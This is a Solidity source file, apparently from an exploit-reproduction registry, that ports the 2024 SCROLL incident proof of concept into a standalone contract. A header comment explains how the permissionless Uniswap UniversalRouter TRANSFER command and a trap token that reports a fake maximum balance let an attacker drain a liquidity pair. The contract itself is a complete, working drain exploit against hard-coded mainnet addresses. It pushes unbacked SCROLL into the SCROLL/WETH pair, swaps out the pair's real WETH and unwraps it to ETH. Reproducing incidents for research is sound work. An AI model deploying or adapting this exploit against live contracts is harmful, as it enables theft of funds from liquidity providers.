// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-05-SCROLL).
//
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry
// `ContractTest` harness (`attacker = address(this)`; the test contract itself
// receives the drained WETH via its `fallback()`) — there is no standalone
// attack contract to deploy. This file is a faithful, self-contained copy of
// that inline attack (testExploit body, verbatim call sequence and constants,
// no imports so it compiles anywhere), compiled inside the registry forge
// project. Logic and constants are copied verbatim from
// test/SCROLL_exp.sol.
//
// Root cause: the Uniswap UniversalRouter is a stateless multicall router
// whose `execute()` is fully permissionless, including command 0x05
// (TRANSFER), which just does `ERC20(token).safeTransfer(recipient, value)`
// from the router's OWN balance (Payments.pay). That is safe only if the
// router actually holds the tokens it's told to send. SCROLL
// (0xe51D…7B7, unverified) is a trap token: after a throwaway 1-wei transfer
// is routed through it, `balanceOf(router)` flips to `type(uint256).max` even
// though the router never received any real SCROLL. Because `execute` trusts
// the caller-supplied `value` and never checks the router's real holdings,
// the attacker tells the router to "transfer" 136.27M (fake) SCROLL into the
// SCROLL/WETH Uniswap V2 pair, then calls `pair.swap(...)` to pull the pair's
// entire genuine WETH reserve (76.36 WETH) out for free. No flash loan, no
// privileged role, no starting capital beyond gas.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

interface IWETH9 {
    function balanceOf(address) external view returns (uint256);
    function withdraw(uint256 wad) external;
}

interface IUniPairV2 {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes memory data) external;
}

interface IUniswapV2Router {
    function getAmountsOut(uint256 amountIn, address[] memory path) external view returns (uint256[] memory amounts);
}

interface IUniversalRouter {
    function execute(bytes calldata commands, bytes[] calldata inputs) external payable;
}

contract SCROLLDrain {
    address public attacker = address(this);
    address constant SCROLL_creater = 0x72C509B05A44c4Bb53373Efc2E76fB75FA8108a6;

    IUniswapV2Router constant router = IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
    IUniPairV2 constant SCROLL_WETH_pair = IUniPairV2(0xa718aa1b3f61C2b90A01aB244597816a7eE69fD2);
    IUniversalRouter constant universalRouter = IUniversalRouter(payable(0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD));

    IERC20 constant SCROLL = IERC20(0xe51D3dE9b81916D383eF97855C271250852eC7B7);
    IWETH9 constant WETH = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    function run() external {
        // Step 0: sanity read — router genuinely holds 0 SCROLL before anything runs.
        SCROLL.balanceOf(address(universalRouter));

        // Step 1: prime the trap — route a throwaway 1-wei TRANSFER of SCROLL
        // through the permissionless router. This is command 0x05 (TRANSFER):
        // Payments.pay() does ERC20(SCROLL).safeTransfer(SCROLL_creater, 1)
        // FROM THE ROUTER'S OWN (believed) balance.
        bytes memory commands = hex"05";
        bytes[] memory inputs = new bytes[](1);
        inputs[0] = abi.encode(address(SCROLL), address(SCROLL_creater), uint256(1));
        universalRouter.execute(commands, inputs);

        // Step 2: confirm the lie — SCROLL now reports balanceOf(router) ==
        // type(uint256).max, even though the router never received real SCROLL.
        SCROLL.balanceOf(address(universalRouter));

        // Step 3-4: size the deposit. Read the pair's real SCROLL balance and ask
        // the router how much WETH a deposit of ~1000x that amount would buy.
        address[] memory path = new address[](2);
        path[0] = address(SCROLL);
        path[1] = address(WETH);
        uint256[] memory amounts = new uint256[](2);
        amounts = router.getAmountsOut(SCROLL.balanceOf(address(SCROLL_WETH_pair)) * 1e3, path);

        // Step 5: push the fake SCROLL "deposit" into the pair via the same
        // permissionless TRANSFER primitive — the router "sends" SCROLL it never
        // held, and the pair credits it as real.
        inputs[0] = abi.encode(address(SCROLL), address(SCROLL_WETH_pair), uint256(amounts[0]));
        universalRouter.execute(commands, inputs);

        // Step 6: swap — pull the pair's entire genuine WETH reserve out against
        // the unbacked SCROLL deposit that was just pushed in.
        SCROLL_WETH_pair.swap(amounts[1], 0, attacker, "");

        // Step 7: unwrap the drained WETH to native ETH.
        WETH.withdraw(WETH.balanceOf(attacker));

        // Step 8: cosmetic mop-up — move the (worthless) infinite SCROLL balance
        // out of the router.
        inputs[0] = abi.encode(address(SCROLL), address(attacker), SCROLL.balanceOf(address(universalRouter)));
        universalRouter.execute(commands, inputs);
    }

    // Receives the unwrapped ETH from WETH.withdraw(...).
    fallback() external payable {}
    receive() external payable {}
}
